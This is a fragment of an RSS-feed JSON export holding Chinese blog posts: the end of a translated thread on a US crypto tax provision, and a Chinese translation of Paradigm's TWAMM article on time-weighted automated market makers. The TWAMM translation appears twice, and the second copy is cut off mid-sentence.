之后，如果还有人说 &ldquo;这么做是没用的&rdquo;，我就要疯了。</p>\n<p>查找您的众议院代表：<a href=\"https://www.house.gov/representatives/find-your-representative\"   target=\"_blank\" >https://www.house.gov/representatives/find-your-representative</a></p>\n<p>查找你的参议员：<a href=\"https://www.senate.gov/senators/senators-contact.htm\"   target=\"_blank\" >https://www.senate.gov/senators/senators-contact.htm</a></p>\n<p>19/ 如果你是一家美国加密货币公司的领导人，并且还没有参与其中，请联系我或 <a href=\"https://twitter.com/BlockchainAssn\"   target=\"_blank\" >@BlockchainAssn</a> 的团队（在给你的国会议员打电话后）。你的发声是特别重要的。</p>\n<p>最后，请大家给 <a href=\"https://twitter.com/coincenter\"   target=\"_blank\" >@coincenter</a> 捐款。他们可能需要它。</p>\n<p>20/ 就我而言，像往常一样，我将与 <a href=\"https://twitter.com/BlockchainAssn\"   target=\"_blank\" >@BlockchainAssn</a>、<a href=\"https://twitter.com/fund_defi\"   target=\"_blank\" >@fund_defi</a> 和其他人合作，提起诉讼，挑战该条款，如果事情发展到这一步。</p>\n<p>我不认为法院会乐于看到一条强迫非托管者（替国税局）监视美国公民的法律。</p>\n<p>21/ 事情进展很快，这可能会让人感到害怕。</p>\n<p>但是，正如此前 FinCEN 的提案一样，我们惊讶地看到，看到整个行业在本周齐心协力地反对这一点。我们确实有一些最好最聪明的人站在我们这边。</p>\n<p>请继续关注更新。</p>\n<p>[END]</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/us_bill/",
          "creator": "Luyao",
          "pubDate": "Sun, 01 Aug 2021 12:41:35 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9f7b433aeecaaeb43c262d9e46ce21b0",
          "highlights": []
        },
        {
          "title": "[译文] TWAMM",
          "description": "<p>原文链接：<a href=\"https://www.paradigm.xyz/2021/07/twamm/\"   target=\"_blank\" >https://www.paradigm.xyz/2021/07/twamm/</a></p>\n<p>作者：<a href=\"https://www.paradigm.xyz/team/davewhite/\"   target=\"_blank\" >Dave White</a>, <a href=\"https://www.paradigm.xyz/team/danrobinson/\"   target=\"_blank\" >Dan Robinson</a>, <a href=\"https://twitter.com/haydenzadams\"   target=\"_blank\" >Hayden Adams</a></p>\n<h2 id=\"简介\">简介</h2>\n<p>本文介绍了一种新型的自动做市商，即AMM，帮助以太坊的交易者<strong>有效地执行大额订单</strong>。</p>\n<p>我们称之为时间加权做市商（time-weighted average market maker），或 TWAMM（发音为 &ldquo;tee-wham&rdquo;）。</p>\n<p>它的工作原理是将长期订单分解成无限多的极小订单，然后在一个恒定乘积AMM里平滑地、逐渐地执行这些它们。</p>\n<h2 id=\"摘要\">摘要</h2>\n<p>假设 Alice 想在链上购买价值 1 亿美金（USDC）的 ETH。这种规模的订单在现有的 AMM（如 Uniswap）上执行是很昂贵的，Alice 会被收取一个很高的价格，以防她知道一些他们不知道的东西（knows something they don&rsquo;t）。</p>\n<p>如今，Alice 的最佳选择是手动将她的订单拆成几个部分，并在几个小时内逐渐执行，让市场意识到她没有内部消息，这样她可以获得一个更好的价格。</p>\n<p>如果她发送几个大的子订单，每个分单仍然会对价格产生显著的影响，并容易受到交易对手的<em>三明治攻击</em>。另一方面，如果她发送许多小的子订单，她将不得不承担频繁交易的所有工作量和风险，且每笔交易都有 gas，她将支付大量的 gas 费用给矿工。</p>\n<p>TWAMM 通过代 Alice 进行交易，为她解决了这个难题。它将她的订单分解成无限多的极小虚拟订单，以确保随着时间推移完全平稳地执行，并通过与内置 AMM 的特殊数学关系，在这些虚拟订单中分摊 gas 成本。因为它的交易过程是跨区块的，所以也不容易受到三明治攻击的影响。</p>\n<h2 id=\"做市商基础知识\">做市商基础知识</h2>\n<h3 id=\"做市商\">做市商</h3>\n<p>考虑两种金融资产的交易市场，例如 USDC 和 ETH。做市商是这个市场的参与者，他愿意在任何时候用其中一个换另一个。</p>\n<p>如果你有 1 亿 USDC，想用它来购买 ETH，你可能无法找到另一个想在同一时间做反向交易的人。相反，你更可能会去一个由一个或多个做市商组成的市场，与他们交易。</p>\n<h3 id=\"逆向选择\">逆向选择</h3>\n<p>做市商从买卖的价差中赚取利润，实际上是他们对每笔交易收取的费用。当价格走势对他们不利时，他们就会亏损 —— 即当他们买入的资产价格下跌，或卖出的资产价格上涨时。</p>\n<p>不幸的是，对做市商来说，价格往往会对他们不利。这种现象被称为<em>逆向选择</em>。原因是掌握未来价格走势信息的交易者更有可能跟做市商进行大额的交易。</p>\n<p>最危险的订单是那些既大额又紧急的订单，因为这些正是知情交易者倾向于下的订单类型。因此，最基本的做市策略是淡化传入的订单，当大额买单进入时上调价格，当大额卖单进入时下调价格。</p>\n<h2 id=\"自动化做市商\">自动化做市商</h2>\n<p>在过去的一年里，以 <a href=\"https://info.uniswap.org/#/\"   target=\"_blank\" >Uniswap</a> 为首的自动化做市商（AMM）在以太坊上大受欢迎，每天处理数十亿美元的交易量。正如他们的名字一样，AMM 将大部分的做市过程自动化了。</p>\n<h3 id=\"恒定乘积公式\">恒定乘积公式</h3>\n<p>恒定乘积公式是一个简单的规则，它允许任何人为一对新资产立即建立一个新交易市场和一个新 AMM。</p>\n<p>为了在两个资产 X 和 Y 之间创建一个新的恒定乘积 AMM（CPAMM），一个用户，我们称他为<em>流动性提供者</em>（LP），存入这两种资产，储备量为 x 和 y。</p>\n<p>这两种资产在任何时候的比率都代表 AMM 的瞬时价格，或者说一个非常小的订单对应的价格。例如，如果一个 CPAMM 储备有 2,000 个 USDC 和 1 个 ETH，那么 ETH 的瞬时价格将是 2000 USDC。</p>\n<p>当交易者来与 AMM 交易时，它根据公式 <strong>x * y = k</strong> 来决定给他们什么价格，其中 x 和 y 是储备量，k 是一个常数。这意味着，在交易过程中储备量的乘积保持不变（忽略费用）。</p>\n<h3 id=\"举例\">举例</h3>\n<p>考虑一个 ETH/USDC 的 CPAMM，储备有 2,000 USDC 和 1 ETH，因此 x = 2,000, y = 1, x*y = k = 2,000。这个 AMM 的瞬时价格是每 ETH 2,000 / 1 = 2,000 USDC。</p>\n<p>如果一个交易者来购买价值 2000 美元的 ETH，这意味着他们将 2000 美元存入 X 储备，这样我们将有 x = 2,000 + 2,000 = 4,000。</p>\n<p>然后，由于 k=2000，我们在交易后必须有 y=x/k=2000/4000=0.5。由于 y 最初是 1，所以 1-0.5=0.5 个 ETH 会到交易者手里。</p>\n<p>由于交易者用他的 2000 个 USDC 购买了 0.5 个 ETH，他支付的平均价格是每个 ETH 4000 USDC。这个价格高于瞬时价格，表明相对于 AMM 的流动性而言，订单金额很大。</p>\n<h3 id=\"价格影响和逆向选择\">价格影响和逆向选择</h3>\n<p>在上述案例中，交易者不得不为他们的大订单支付每 ETH 4,000 USDC，而小订单的成本仅为每 ETH 2,000 USDC。这种价格差异被称为订单的<em>价格影响</em>。订单金额越大，价格影响就越大。</p>\n<p>这就是 AMM 对抗逆向选择的方式：大额订单更有可能被感知到，因此 AMM 让他们支付高价。这相当于自动化的淡化订单。</p>\n<h2 id=\"在当前的-amm-上执行大额订单\">在当前的 AMM 上执行大额订单</h2>\n<h3 id=\"手动拆分订单\">手动拆分订单</h3>\n<p>正如我们所看到的，单笔交易中执行大额订单，在 AMM 里被设计得很昂贵。<a href=\"https://www.paradigm.xyz/2021/04/understanding-automated-market-makers-part-1-price-impact/\"   target=\"_blank\" >这篇精彩的文章</a> 深入探讨了这个问题并推荐了一些解决方案。</p>\n<p>简而言之，希望在 AMM 上执行大额订单的交易者不应该在单笔交易中执行：他们最好将订单分成若干部分。这可能涉及到同时向几个 AMM 发送订单，不过这些 AMM 在任何时间点上的流动性也都有限。订单金额越大，随着时间推移逐渐拆分订单就越有吸引力。</p>\n<p>例如，假设一个投资者想在链上购买 1 亿 USDC 的 ETH。他们没有任何关于 ETH 价格的短期信息，所以不介意订单需要一些时间来执行。在这种情况下，他们可能会把订单拆分成 10 部分，每部分 1000 万 USDC，每隔一小时执行一部分，从而限制每部分的价格影响。</p>\n<h3 id=\"子订单大小的权衡\">子订单大小的权衡</h3>\n<p>显然，如果一个非常大的订单被分割成几块，每个单独的子订单仍然很大，并将产生相应的价格影响。将订单分割成更小的部分会有帮助，但这也引入了两个新问题。</p>\n<p>第一个问题是<em>操作复杂性</em>，意味着风险和工作量的增加。交易者可能会输错交易量，或者输错交易方向。或者她的电脑可能死机，使得一些订单没法执行。即使一切顺利，这个过程也需要时间和精力，把注意力从更有利可图的工作中分散出来。</p>\n<p>第二个问题是，每笔交易都会产生固定的<em>交易成本</em>，如支付给以太坊矿工处理交易的<em>gas</em>。如果交易者将她的订单分成太多部分，她最终可能会支付比实际购买的 ETH 还要多的交易费用。</p>\n<h2 id=\"与传统金融的类比\">与传统金融的类比</h2>\n<p>在传统金融的世界里，如果一个投资者或机构想购买 1 亿美元的苹果股票，他们不会直接向交易所发送 1 亿美元的购买订单。他们也不会发送 10 个这样的订单，每个 1000 万美元。把订单分成比这小得多的部分，对大多数没有专门交易人员和基础设施的人来说是不现实的。</p>\n<p>相反，他们最有可能将他们的大订单发送给经纪人，经纪人将为他们在交易所进行 <a href=\"https://en.wikipedia.org/wiki/Algorithmic_trading\"   target=\"_blank\" >算法交易</a> 并收取费用。经纪人会在一个特定的时间段内执行交易，比如 8 个小时，价格会有大致的基准。经纪人有一个专门执行这种交易的团队，既安全又便宜。</p>\n<h3 id=\"twap时间加权平均价格订单\">TWAP（时间加权平均价格）订单</h3>\n<p>最基本的算法交易类型可能就是 <a href=\"https://en.wikipedia.org/wiki/Time-weighted_average_price\"   target=\"_blank\" >时间加权平均价格</a>，或 TWAP（发音为 &ldquo;tee-whap&rdquo;）订单。一个在 8 小时内买入 1 亿美元苹果股票的 TWAP 订单，顾名思义，将以接近该期间苹果股票的时间加权平均价的价格成交。</p>\n<p>例如，如果苹果股票在这段时间内有四个小时的价格是 100 美元，四个小时的价格是 120 美元，那么时间加权平均价格将是 ($100*4+$120*4)/8=110 美元，经纪人将以接近这个价格执行 TWAP 订单。</p>\n<p>细节各不相同，但经纪人多半会通过在一天内将其分割成许多小块并发送给市场来执行这一交易。在 8 个小时内买入 1 亿美元的苹果股票，相当于每 100 毫秒买入约 350 美元的苹果股票，我们可能期望经纪人或多或少会这样做。</p>\n<p>经纪人有基础设施来减少或消除如此多小交易的操作复杂性，而且，由于他们与市场有直接联系，很可能不必支付太多的交易成本。</p>\n<h2 id=\"时间加权做市商\">时间加权做市商</h2>\n<p>时间加权做市商（TWAMM）相当于提供了链上的 TWAP 订单。TWAMM 有专门的逻辑来分割订单，并直接连接到内置交易所，在低 gas 成本下平滑执行。套利者使 TWAMM 内置交易所的价格与市场价格保持一致，以确保订单执行接近于时间加权平均价格。</p>\n<h3 id=\"概述\">概述</h3>\n<p>每个 TWAMM 实例为特定的资产对提供交易，如 ETH 和 USDC。</p>\n<p>TWAMM 包含一个内置的 AMM，即这两种资产的标准恒定乘积做市商。任何人都可以在任何时候与这个内置 AMM 进行交易，仿佛它是个普通的 AMM 一样。</p>\n<p>交易者可以向 TWAMM 提交<em>长期订单</em>，即在固定数量的区块中出售固定数量的资产 —— 比如，在未来 2000 个区块中卖出 100ETH 的订单。</p>\n<p>TWAMM 将这些长期订单分解为无限多、无限小的虚拟子订单，这些虚拟子订单逐渐以均匀的速度与内置 AMM 交易。单独处理这些虚拟子订单的交易将耗费无限的 gas，但一个闭型数学公式允许我们在需要时才计算其累积结果。</p>\n<p>长期订单的执行将推动内置 AMM 的价格随着时间的推移远离其他市场的价格。当这种情况发生时，套利者将针对内置 AMM 的价格进行套利交易，使其回到一致，确保长期订单的良好执行。</p>\n<p>例如，如果长期卖出订单使得 ETH 在内置 AMM 上的价格比某个中心化交易所的价格更便宜，套利者将从内置 AMM 上买入 ETH，使其价格回升，并在中心化交易所卖出来获利。</p>\n<h3 id=\"以太坊复习\">以太坊复习</h3>\n<h4 id=\"区块\">区块</h4>\n<p>以太坊将交易打包成连续的小组，称为区块，大约每 13 秒一个。在这本文里，我们将对每个区块进行编号：区块 1 后面是区块 2，区块 2 后面是区块 3，以此类推。</p>\n<h4 id=\"矿工\">矿工</h4>\n<p>分散的矿工群体会竞争处理每个区块。任何能接入互联网的人都可以成为矿工。这意味着像 AMM 这种运行在以太坊上的程序没有任何秘密：每个人都必须能够准确计算出在某个输入的情况下会发生什么。</p>\n<h4 id=\"gas\">Gas</h4>\n<p>以太坊上的计算是一种稀缺资源，因此用户必须以 gas 的形式向矿工付费。一个交易涉及的计算量越大，它消耗的 gas 就越多。这个 gas 成本完全由提交交易的人支付。</p>\n<h3 id=\"基本设计\">基本设计</h3>\n<h4 id=\"长期订单\">长期订单</h4>\n<p>Alice 想在未来 8 小时内买入价值 1 亿美金的 ETH，或者大约 2000 个区块。她在 TWAMM 中下了一个长期订单，在 2000 个区块中购买价值 1 亿 USDC 的 ETH，或每个区块 50,000 USDC。</p>\n<p>正如之前提到的，我们无法事先知道哪些矿工将在 TWAMM 上处理未来的交易。这意味着 Alice 的订单必须对每个人都是可见的，这就引入了信息泄露的问题，我们会在下面讨论。</p>\n<h4 id=\"订单池\">订单池</h4>\n<p>Bob 想在接下来的 5000 个区块中卖出 500 个 ETH 换取 USDC，即每个区块 0.1ETH。</p>\n<p>Charlie 想在接下来的 2000 个区块中卖出 100 个 ETH 换取 USDC，即每区块 0.05 个 ETH。</p>\n<p>在 Charlie 的订单在 2000 个区块内到期之前，Bob 和 Charlie 的订单将被分组在一个池中。</p>\n<p>这个 ETH 卖出池将在接下来的 2000 个区块中以每区块 0.15ETH 的速度卖出 ETH。Bob 将获得该池子收到 USDC 的 0.1/0.15≈66%，Charlie 则获得 0.05/0.15≈33%。</p>\n<h4 id=\"虚拟订单\">虚拟订单</h4>\n<p>在接下来 2000 个区块的每个区块中，TWAMM 要代表 Alice 买入价值 50,000 USDC 的 ETH，还要代表 ETH 卖出池卖出 0.15 ETH 换取 USDC。</p>\n<p>我们可以想象，TWAMM 将这两个子订单中的每一个分成数万亿个微小的子子订单，我们称之为虚拟订单（事实上，它将它们分成无数个无限小的虚拟订单）。</p>\n<p>然后，TWAMM 轮流对内置 AMM 执行这些虚拟订单：首先是 Alice 的一个虚拟订单，然后是 ETH 卖出池的一个，然后是 Alice 的另一个，以此类推。</p>\n<h4 id=\"套利\">套利</h4>\n<p>因为 Alice 买入的 ETH 比 ETH 池卖出的 ETH 多得多，所以内置 AMM 上的 ETH 价格在每个区块都会上升。</p>\n<p>当这个价格相对于其他地方的 ETH 价格足够高时，套利者会在其他交易所买入更便宜的 ETH，然后在内置 AMM 上卖出，让价格回到市场平均水平，确保 Alice 的订单良好地执行。</p>\n<h4 id=\"订单到期\">订单到期</h4>\n<p>在 2,000 个区块之后，Alice 的订单将被完全成交，Charlie 的也是如此。Bob 卖出 ETH 的订单在接下来的 3000 个区块中仍然有效，TWAMM 将在这期间以每区块 0.1ETH 的速度继续执行。</p>\n<p>如果没有任何外部活动，随着时间的推移，这将推动内置 AMM 上 ETH 的价格下降，这次则促使套利者在价格充分偏离后将它重新拉升。</p>\n<h4 id=\"经济学\">经济学</h4>\n<p>由于 Alice、Bob 或 Charlie 都不急于执行他们的订单，其他市场参与者可以推断出他们的订单所代表的逆向选择比较少，并可以为他们提供低价格影响的交易。</p>\n<p>由于 TWAMM 将会是像 Alice、Bob 和 Charlie 这样的人进行交易的最佳场所，TWAMM 的内置 AMM 上的流动性提供者会乐意与这些大体量的不知情资金进行交互。这有助于从费用中赚钱，同时相对减少他们对逆向选择的暴露。</p>\n<h3 id=\"无限小的虚拟订单\">无限小的虚拟订单</h3>\n<p>我们在上面提到，TWAMM 将长期订单分割成无限多的无限小的子订单。这样做有两个原因：平滑性和效率。</p>\n<h4 id=\"平滑性\">平滑性</h4>\n<p>TWAMM 的主要目标是在一段时间内平滑地执行长期订单，使其以接近当时的时间加权平均价格执行。</p>\n<p>随着我们减小虚拟交易的金额，AMM 上价格轨迹中的锯齿变得越来越小。</p>\n<p>在极限情况下，有无限多的无限小的交易，价格轨迹在虚拟交易被执行时是完全平滑的。</p>\n<p><img src=\"https://zhangluyao.com/images/twamm/amm_eth-1-1536x1153.png\" alt=\"\"></p>\n<p>见 <a href=\"https://github.com/para-dave/twamm/blob/master/splitting_exploration.ipynb\"   target=\"_blank\" >https://github.com/para-dave/twamm/blob/master/splitting_exploration.ipynb</a></p>\n<h4 id=\"效率\">效率</h4>\n<p>由于 TWAMM 被设计为在以太坊上使用，在每一个区块中都准确计算多笔虚拟交易将是非常昂贵的。然而，当我们有无限多的无限小的交易时，我们可以在单次计算中算出交易者的结果，无论距离上次检查已经过了多少个区块。</p>\n<h2 id=\"实现\">实现</h2>\n<h3 id=\"惰性求值\">惰性求值</h3>\n<p>TWAMM 将虚拟子订单视为发生在多个区块之间，这对避免三明治攻击很重要。</p>\n<p>为了以节省 gas 的方式实现这一点，TWAMM 使用<em>惰性求值（lazy evaluation）</em>，只在需要确定交互结果时才计算虚拟交易的效果。</p>\n<p>每次用户与 TWAMM 交互时（例如，与内置 AMM 交易，或添加新的长期订单），TWAMM 将追溯计算自上次交互以来发生的所有虚拟交易的结果。</p>\n<p>因为这些虚拟交易只与 TWAMM 的内置 AMM 交互，所以 TWAMM 的状态在两次外部交互之间是完全确定不变的。即使 TWAMM 在两次外部交互之间有一百万个区块，下次有人与它交互时，它还是能够准确地计算出所有虚拟交易的结果。</p>\n<p>接入 TWAMM 的前端页面，将可以通过追踪当前区块编号，自己进行 TWAMM 计算来得到尚未在链上呈现的虚拟交易结果。</p>\n<h3 id=\"gas-优化\">Gas 优化</h3>\n<h4 id=\"订单池-1\">订单池</h4>\n<p>如例子所示，当我们有多个同方向的长期订单时（如卖出 ETH 换取 USDC），我们会在把它们分割成虚拟订单之前，先将它们集中在一个池子里。然后，TWAMM 可以用一种 <a href=\"https://www.paradigm.xyz/2021/05/liquidity-mining-on-uniswap-v3/\"   target=\"_blank\" >十亿美元算法</a> 来追踪余额，这种算法曾在 Compound 和 Uniswap 等协议中用于追踪 LP 奖励。</p>\n<p>从技术上讲，每个 TWAMM 总是有两个长期订单池，两种资产各一个：例如，卖出 USDC 的池和卖出 ETH 的池。只是在任何时候，这些池子中的一个或两个都有可能是空的。</p>\n<h4 id=\"长期订单的到期\">长期订单的到期</h4>\n<p>当把订单池和惰性求值结合起来使用时，会出现一种复杂情况。</p>\n<p>想象一下，Bob 下了一个在未来 100 个区块内卖出 100ETH 的订单，Charlie 下了一个在未来 200 个区块内卖出 200ETH 的订单。两个订单都是以每区块 1ETH 的速度卖出。</p>\n<p>假设在接下来的 150 个区块中没有人与 TWAMM 交互，此时出现了一次新的外部交互。在 Bob 和 Charlie 下单后的前 100 个区块中，他们的订单被汇集成一个共同的订单，每区块卖出 2 个 ETH。然而，在这之后的 50 个区块中，Charlie 的订单是独立的，每区块只卖 1 个 ETH。</p>\n<p>这意味着我们必须做两个独立的交易计算，来搞明白发生了什么：一个是前 100 个区块的结果，一个是最后 50 个区块的计算。在最坏的情况下，如果在过去的 150 个区块中，每个区块都有订单到期，这意味着 TWAMM 将不得不处理每个区块的交易，严重影响了 gas 效率。</p>\n<p>最简单的解决方法是限制订单到期的区块数量：例如，TWAMM 可以指定订单只能每 250 个区块到期一次，即大约每小时一次。</p>\n<h4 id=\"长期订单的取消\">长期订单的取消</h4>\n<p>用户可以在任何时候取消长期订单。在实践中，这允许用户为他们的订单选择取消时间，精确到区块。这不会增加系统的 gas 负担，因为想取消订单的用户要支付自己的 gas。</p>\n<h3 id=\"虚拟交易中的数学\">虚拟交易中的数学</h3>\n<h4 id=\"定义\">定义</h4>\n<p>假设距离 TWAMM 最后一次执行任何虚拟交易已经过去了 t 个区块。</p>\n<p>为简单起见，假设没有长期订单过期，那么在整个时间段内，X 的卖出池每区块卖出 \\(x_{rate}\\)，Y 的卖出池每区块卖出 \\(y_{rate}\\)。</p>\n<p>那么这段时间内卖出的 X 总量为 \\(tx_{rate}=x_{in}\\)，这段时间内卖出的 Y 总量为 \\(ty_{rate}=y_{in}\\)。</p>\n<p>让我们把时间段开始时的内置 AMM 储备分别表示为 \\(x_{ammStart}\\) 和 \\(y_{ammStart}\\) 。</p>\n<h4 id=\"公式\">公式</h4>\n<p>在所有的虚拟交易处理完毕后，内置 AMM 中 X 储备量为</p>\n<p>\\[x_{ammEnd} = \\sqrt {\\frac {kx_{in}}{y_{in}}}\\frac {e^{2\\sqrt {\\frac {x_{in} y_{in}}{k}}}+c}{e^{2\\sqrt {\\frac {x_{in} y_{in}}{k}}}-c}\\]</p>\n<p>其中</p>\n<p>\\[c = \\frac {\\sqrt {x_{ammStart} y_{in}}-\\sqrt {y_{ammStart} x_{in}}}{\\sqrt {x_{ammStart} y_{in}}+\\sqrt {y_{ammStart} x_{in}}}\\]</p>\n<p>从恒定乘积公式，我们知道</p>\n<p>\\[y_{ammEnd}=\\frac {x_{ammStart} y_{ammStart}}{x_{ammEnd}}\\]</p>\n<p>X 的卖出池得到所有没有最终进入内置 AMM 的 Y—— 也就是说，</p>\n<p>\\[y_{out} = y_{ammStart} + y_{in} - y_{ammEnd}\\]</p>\n<p>类似的，</p>\n<p>\\[x_{out} = x_{ammStart} + x_{in} - x_{ammEnd}\\]</p>\n<h2 id=\"潜在的攻击途径\">潜在的攻击途径</h2>\n<h3 id=\"三明治攻击\">三明治攻击</h3>\n<h4 id=\"描述\">描述</h4>\n<p>在 <a href=\"https://research.paradigm.xyz/MEV\"   target=\"_blank\" >三明治攻击</a> 中，攻击者 Atticus 看到交易员 Trey 即将在 AMM 上进行交易。Atticus 发送两个订单，将 Trey 的订单夹在中间，从中获利。</p>\n<p>想象一下，Trey 向一个 AMM 发送了一个用 USDC 购买 ETH 的订单。看到这一点，Atticus 在 Trey 之前在 AMM 上下了一个购买 ETH 的订单，推动价格上涨。由于他向 AMM 付手续费并产生了价格影响，Atticus 在这个订单上是亏损的。</p>\n<p>当 Trey 的订单被执行时，他以比原来更高的价格买入 ETH，因为 Atticus 已经推高了价格。Trey 的订单推动了价格进一步上涨。</p>\n<p>现在，Atticus 把他的 ETH 卖回给 AMM。由于 Trey 买入后推高了 AMM 的价格，他卖出的价格高于他买入的价格，能够实现盈利。</p>\n<p>只有当 Atticus 能保证在 Trey 买入后，他能够立即将他的 ETH 卖回 AMM，这种攻击才有意义。在一个特定的区块内，如果 Atticus 是一个矿工，或与一个矿工达成合作，或者使用像 <a href=\"https://medium.com/flashbots/frontrunning-the-mev-crisis-40629a613752\"   target=\"_blank\" >Flashbots</a> 这样的服务，就有可能。</p>\n<h4 id=\"三明治攻击和虚拟订单\">三明治攻击和虚拟订单</h4>\n<p>乍一看，虚拟订单似乎特别容易受到夹层攻击，因为每个人都知道它们会到来。</p>\n<p>然而，它们是安全的，因为交易是在区块之间执行的。想要夹住 TWAMM 虚拟订单的攻击者必须在一个区块末尾时在内置 AMM 进行交易，导致虚拟订单在区块之间以较差的价格执行，然后在下一个区块开始时进行反向交易。</p>\n<p>目前来说，攻击者没有办法保证他们只在某个区块的末尾进行交易，同时还能在下一个区块的开头进行交易。当这种<em>多区块 MEV</em>变得更加普遍时，允许交易者跨越多个区块进行夹击可能会成为一个问题。</p>\n<h4 id=\"信息泄露\">信息泄露</h4>\n<p>长期交易者在 TWAMM 中可能遇到的最大权衡是他们在下公开可见的订单时面临的<em>信息泄露</em>，由于以太坊的性质，这是必然的。</p>\n<p>如果一个交易者下了一个足够大的长期订单，其他交易者可能会被<em>抢跑 (front-run)</em> 诱惑，在 TWAMM 的内置 AMM 和其他地方买入资产，以便在长期订单推高价格的时候卖回给该交易者。</p>\n<p>由于用户可以在任何时候取消他们的长期订单，我们预计过于激进的抢跑者会被其他交易者所利用，从而控制信息泄露的整体影响。</p>\n<h4 id=\"例子\">例子</h4>\n<p>想象一下，Sally 注意到了 TWAMM 上激进的抢跑行为。于是她从一个流动性聚合器中购买了 100 万 USDC 的 ETH，推高了整个市场的价格。然后她在 TWAMM 上下了一个巨大的长期订单，在接下来的 24 小时内每个区块买入 10 万 USDC 的 ETH。</p>\n<p>马上，抢跑者 Frank 看到了这个订单，并通过聚合器买入一百万 USDC 的 ETH，进一步推高了价格。Sally 通过聚合器卖回了她的 ETH，获得了收益，推动价格回落，给 Frank 留下了损失。最后，她在订单被执行之前取消了她的长期订单。</p>\n<h2 id=\"python-参考实现\">Python 参考实现</h2>\n<p>你可以在 <a href=\"https://github.com/para-dave/twamm\"   target=\"_blank\" >这里</a> 看到一个 TWAMM 的 Python 参考实现。</p>\n<p>这个 <a href=\"https://github.com/para-dave/twamm/blob/master/twamm_demo.ipynb\"   target=\"_blank\" >Jupyter notebook</a> 演示了 TWAMM 的行为，有多个互相抵消的长期订单和套利者。</p>\n<p>为了简单起见，这个 Python 版本没有实现 gas 优化，如订单池或真正的惰性求值。</p>\n<h2 id=\"总结\">总结</h2>\n<p>我们已经勾勒出了 TWAMM 的设计，但我们的工作才刚刚开始。</p>\n<p>如果你对这个问题或类似的问题感兴趣，你可以发邮件到 <a href=\"ideas@uniswap.org\"  >dave@paradigm.xyz</a> 或 <a href=\"https://twitter.com/messages/compose?recipient_id=1184231093576392704\"   target=\"_blank\" >在 Twitter 上私信我</a>，或者联系 Uniswap 实验室，<a href=\"ideas@uniswap.org\"  >ideas@uniswap.org</a>。</p>\n",
          "content": "<p>原文链接：<a href=\"https://www.paradigm.xyz/2021/07/twamm/\"   target=\"_blank\" >https://www.paradigm.xyz/2021/07/twamm/</a></p>\n<p>作者：<a href=\"https://www.paradigm.xyz/team/davewhite/\"   target=\"_blank\" >Dave White</a>, <a href=\"https://www.paradigm.xyz/team/danrobinson/\"   target=\"_blank\" >Dan Robinson</a>, <a href=\"https://twitter.com/haydenzadams\"   target=\"_blank\" >Hayden Adams</a></p>\n<h2 id=\"简介\">简介</h2>\n<p>本文介绍了一种新型的自动做市商，即AMM，帮助以太坊的交易者<strong>有效地执行大额订单</strong>。</p>\n<p>我们称之为时间加权做市商（time-weighted average market maker），或 TWAMM（发音为 &ldquo;tee-wham&rdquo;）。</p>\n<p>它的工作原理是将长期订单分解成无限多的极小订单，然后在一个恒定乘积AMM里平滑地、逐渐地执行这些它们。</p>\n<h2 id=\"摘要\">摘要</h2>\n<p>假设 Alice 想在链上购买价值 1 亿美金（USDC）的 ETH。这种规模的订单在现有的 AMM（如 Uniswap）上执行是很昂贵的，Alice 会被收取一个很高的价格，以防她知道一些他们不知道的东西（knows something they don&rsquo;t）。</p>\n<p>如今，Alice 的最佳选择是手动将她的订单拆成几个部分，并在几个小时内逐渐执行，让市场意识到她没有内部消息，这样她可以获得一个更好的价格。</p>\n<p>如果她发送几个大的子订单，每个分单仍然会对价格产生显著的影响，并容易受到交易对手的<em>三明治攻击</em>。另一方面，如果她发送许多小的子订单，她将不得不承担频繁交易的所有工作量和风险，且每笔交易都有 gas，她将支付大量的 gas 费用给矿工。</p>\n<p>TWAMM 通过代 Alice 进行交易，为她解决了这个难题。它将她的订单分解成无限多的极小虚拟订单，以确保随着时间推移完全平稳地执行，并通过与内置 AMM 的特殊数学关系，在这些虚拟订单中分摊 gas 成本。因为它的交易过程是跨区块的，所以也不容易受到三明治攻击的影响。</p>\n<h2 id=\"做市商基础知识\">做市商基础知识</h2>\n<h3 id=\"做市商\">做市商</h3>\n<p>考虑两种金融资产的交易市场，例如 USDC 和 ETH。做市商是这个市场的参与者，他愿意在任何时候用其中一个换另一个。</p>\n<p>如果你有 1 亿 USDC，想用它来购买 ETH，你可能无法找到另一个想在同一时间做反向交易的人。相反，你更可能会去一个由一个或多个做市商组成的市场，与他们交易。</p>\n<h3 id=\"逆向选择\">逆向选择</h3>\n<p>做市商从买卖的价差中赚取利润，实际上是他们对每笔交易收取的费用。当价格走势对他们不利时，他们就会亏损 —— 即当他们买入的资产价格下跌，或卖出的资产价格上涨时。</p>\n<p>不幸的是，对做市商来说，价格往往会对他们不利。这种现象被称为<em>逆向选择</em>。原因是掌握未来价格走势信息的交易者更有可能跟做市商进行大额的交易。</p>\n<p>最危险的订单是那些既大额又紧急的订单，因为这些正是知情交易者倾向于下的订单类型。因此，最基本的做市策略是淡化传入的订单，当大额买单进入时上调价格，当大额卖单进入时下调价格。</p>\n<h2 id=\"自动化做市商\">自动化做市商</h2>\n<p>在过去的一年里，以 <a href=\"https://info.uniswap.org/#/\"   target=\"_blank\" >Uniswap</a> 为首的自动化做市商（AMM）在以太坊上大受欢迎，每天处理数十亿美元的交易量。正如他们的名字一样，AMM 将大部分的做市过程自动化了。</p>\n<h3 id=\"恒定乘积公式\">恒定乘积公式</h3>\n<p>恒定乘积公式是一个简单的规则，它允许任何人为一对新资产立即建立一个新交易市场和一个新 AMM。</p>\n<p>为了在两个资产 X 和 Y 之间创建一个新的恒定乘积 AMM（CPAMM），一个用户，我们称他为<em>流动性提供者</em>（LP），存入这两种资产，储备量为 x 和 y。</p>\n<p>这两种资产在任何时候的比率都代表 AMM 的瞬时价格，或者说一个非常小的订单对应的价格。例如，如果一个 CPAMM 储备有 2,000 个 USDC 和 1 个 ETH，那么 ETH 的瞬时价格将是 2000 USDC。</p>\n<p>当交易者来与 AMM 交易时，它根据公式 <strong>x * y = k</strong> 来决定给他们什么价格，其中 x 和 y 是储备量，k 是一个常数。这意味着，在交易过程中储备量的乘积保持不变（忽略费用）。</p>\n<h3 id=\"举例\">举例</h3>\n<p>考虑一个 ETH/USDC 的 CPAMM，储备有 2,000 USDC 和 1 ETH，因此 x = 2,000, y = 1, x*y = k = 2,000。这个 AMM 的瞬时价格是每 ETH 2,000 / 1 = 2,000 USDC。</p>\n<p>如果一个交易者来购买价值 2000 